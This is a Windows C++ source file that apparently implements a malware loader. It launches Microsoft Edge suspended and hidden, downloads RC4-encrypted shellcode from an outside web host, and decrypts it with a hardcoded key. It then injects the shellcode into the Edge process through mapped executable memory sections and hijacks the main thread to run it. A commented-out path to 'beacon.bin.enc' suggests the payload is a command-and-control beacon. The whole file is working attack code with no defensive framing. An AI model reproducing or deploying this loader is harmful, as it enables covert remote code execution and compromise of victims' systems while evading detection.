#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include "Native.h"
#include <fstream>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

void RC4Decrypt(std::vector<BYTE>& data, const std::string& key) {
    int keylen = key.size();
    unsigned char s[256];
    for (int i = 0; i < 256; ++i)
        s[i] = i;

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % keylen]) % 256;
        std::swap(s[i], s[j]);
    }

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); ++n) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

std::vector<BYTE> read(const char path[])
{
    std::ifstream file(path, std::ios::binary);
    std::vector<BYTE> data(std::istreambuf_iterator<char>(file), {});
    file.close();

    return data;
}

void main()
{
    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";

    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/d\0");
    // std::vector<BYTE> shellcode = read("C:\\Windows\\beacon.bin.enc");

    if (shellcode.empty()) {
        std::cerr << "Failed to load shellcode from URL." << std::endl;
        return;
    }

    // Decrypt the shellcode
    std::string key = "password";
    RC4Decrypt(shellcode, key);

    // find Nt APIs
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}